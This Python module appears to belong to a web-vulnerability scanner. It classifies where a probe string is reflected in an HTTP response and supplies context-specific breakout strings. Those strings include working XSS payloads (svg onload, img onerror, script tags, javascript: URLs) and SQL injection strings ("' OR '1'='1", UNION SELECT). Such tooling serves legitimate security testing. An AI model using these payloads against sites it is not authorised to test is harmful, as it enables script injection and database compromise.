"""
Reflection-context analyser.

Send one unique probe marker through a parameter, then find WHERE it lands in the
response. The context decides which encodings are meaningful and which breakout prefix
turns a reflection into execution -- this is what keeps the arsenal a scalpel: we only
generate variants that can matter in the observed context.

Usage:
    probe = new_probe()                       # unique, greppable marker
    # ...send probe as the parameter value, capture response body...
    res = analyze_reflection(body, probe)
    res["contexts"]   -> ["html_attr_dq", ...]
    res["breakouts"]  -> ['">', '"><svg onload=1>', ...]
    res["snippets"]   -> [{context, excerpt}]

Purely local string analysis; no network here.
"""
from __future__ import annotations

import re
import secrets
from enum import Enum
from typing import Dict, List, Optional


class ReflectionContext(str, Enum):
    HTML_TEXT = "html_text"                 # <div>PROBE</div>
    HTML_ATTR_DQ = "html_attr_dq"           # value="PROBE"
    HTML_ATTR_SQ = "html_attr_sq"           # value='PROBE'
    HTML_ATTR_UNQUOTED = "html_attr_unquoted"  # value=PROBE
    HTML_COMMENT = "html_comment"           # <!-- PROBE -->
    SCRIPT_BODY = "script_body"             # <script> ... PROBE ... </script>
    SCRIPT_DQ = "script_dq"                 # var x = "PROBE"
    SCRIPT_SQ = "script_sq"                 # var x = 'PROBE'
    URL_ATTR = "url_attr"                   # href="...PROBE..."
    SQL_ERROR = "sql_error"                 # a DB error naming PROBE / SQL syntax
    JSON_VALUE = "json_value"               # "field":"PROBE"
    NONE = "none"                           # did not reflect


# Breakout prefixes per context: what you prepend to escape the current context into
# script execution (XSS) or out of the current literal.
_BREAKOUTS: Dict[ReflectionContext, List[str]] = {
    ReflectionContext.HTML_TEXT: ["<svg onload=PROBE>", "<img src=x onerror=PROBE>", "<script>PROBE</script>"],
    ReflectionContext.HTML_ATTR_DQ: ['"><svg onload=PROBE>', '" autofocus onfocus=PROBE x="', '"><script>PROBE</script>'],
    ReflectionContext.HTML_ATTR_SQ: ["'><svg onload=PROBE>", "' autofocus onfocus=PROBE x='", "'><script>PROBE</script>"],
    ReflectionContext.HTML_ATTR_UNQUOTED: [" onmouseover=PROBE ", " autofocus onfocus=PROBE "],
    ReflectionContext.HTML_COMMENT: ["--><svg onload=PROBE>", "--><script>PROBE</script>"],
    ReflectionContext.SCRIPT_BODY: [";PROBE;//", "\nPROBE\n"],
    ReflectionContext.SCRIPT_DQ: ['";PROBE;//', '"-PROBE-"', '"};PROBE;{"'],
    ReflectionContext.SCRIPT_SQ: ["';PROBE;//", "'-PROBE-'", "'};PROBE;{'"],
    ReflectionContext.URL_ATTR: ["javascript:PROBE", "\"><svg onload=PROBE>"],
    ReflectionContext.SQL_ERROR: ["' OR '1'='1", "') OR ('1'='1", "' UNION SELECT NULL-- -"],
    ReflectionContext.JSON_VALUE: ['","injected":"PROBE', '"}]};PROBE'],
    ReflectionContext.NONE: [],
}

_SQL_ERROR_SIGNS = re.compile(
    r"(SQL syntax|mysql_fetch|ORA-\d{5}|PostgreSQL.*ERROR|SQLite/JDBCDriver|"
    r"Unclosed quotation mark|quoted string not properly terminated|"
    r"Warning:\s+\w+\(\)|syntax error at or near|SQLSTATE\[)",
    re.IGNORECASE,
)


def new_probe(prefix: str = "grz") -> str:
    """A unique, alnum-only marker that survives HTML/URL contexts unescaped."""
    return f"{prefix}{secrets.token_hex(5)}"


def _iter_positions(body: str, probe: str):
    start = 0
    while True:
        i = body.find(probe, start)
        if i < 0:
            return
        yield i
        start = i + len(probe)


def _classify_position(body: str, i: int, probe: str) -> ReflectionContext:
    pre = body[max(0, i - 200):i]
    post = body[i + len(probe): i + len(probe) + 100]

    # inside a <script> block?
    last_open = pre.rfind("<script")
    last_close = pre.rfind("</script")
    if last_open > last_close:
        # what quote encloses us within the script?
        sq = pre.rfind("'"); dq = pre.rfind('"')
        if dq > sq and dq > last_open:
            return ReflectionContext.SCRIPT_DQ
        if sq > dq and sq > last_open:
            return ReflectionContext.SCRIPT_SQ
        return ReflectionContext.SCRIPT_BODY

    # inside an HTML comment?
    if pre.rfind("<!--") > pre.rfind("-->"):
        return ReflectionContext.HTML_COMMENT

    # inside a tag (attribute area)? find the last unclosed '<'
    lt = pre.rfind("<"); gt = pre.rfind(">")
    if lt > gt:
        attr = pre[lt:]
        # url-ish attribute?
        if re.search(r'(href|src|action|formaction|data|xlink:href)\s*=\s*["\']?[^"\'>]*$',
                     attr, re.IGNORECASE):
            return ReflectionContext.URL_ATTR
        m = re.search(r'=\s*(["\'])(?:[^"\']*)$', attr)
        if m:
            return ReflectionContext.HTML_ATTR_DQ if m.group(1) == '"' else ReflectionContext.HTML_ATTR_SQ
        if re.search(r'=\s*[^"\'\s>]*$', attr):
            return ReflectionContext.HTML_ATTR_UNQUOTED
        return ReflectionContext.HTML_TEXT

    # JSON value?
    if re.search(r':\s*"[^"]*$', pre) and post.lstrip().startswith(('"', '",', '"}')):
        return ReflectionContext.JSON_VALUE

    return ReflectionContext.HTML_TEXT


def analyze_reflection(body: Optional[str], probe: str,
                       context_size: int = 80) -> Dict:
    """Return the reflection contexts, breakout suggestions and snippets for `probe`.

    A SQL-error context is inferred from the response body even when the probe itself
    is not echoed (blind reflection into a query that errors).
    """
    body = body or ""
    contexts: List[str] = []
    snippets: List[Dict] = []

    for i in _iter_positions(body, probe):
        ctx = _classify_position(body, i, probe)
        if ctx.value not in contexts:
            contexts.append(ctx.value)
        s = max(0, i - context_size)
        snippets.append({"context": ctx.value,
                         "excerpt": body[s:i + len(probe) + context_size]})

    reflected = len(contexts) > 0
    if _SQL_ERROR_SIGNS.search(body):
        if ReflectionContext.SQL_ERROR.value not in contexts:
            contexts.append(ReflectionContext.SQL_ERROR.value)

    if not contexts:
        contexts = [ReflectionContext.NONE.value]

    breakouts: List[str] = []
    for c in contexts:
        for b in breakouts_for(c):
            if b not in breakouts:
                breakouts.append(b)

    return {
        "reflected": reflected,
        "contexts": contexts,
        "breakouts": breakouts,
        "snippets": snippets[:5],
    }


def breakouts_for(context: str, marker: str = "alert(1)") -> List[str]:
    """Concrete breakout strings for a context, with PROBE filled by `marker`."""
    try:
        ctx = ReflectionContext(context)
    except ValueError:
        return []
    return [b.replace("PROBE", marker) for b in _BREAKOUTS.get(ctx, [])]
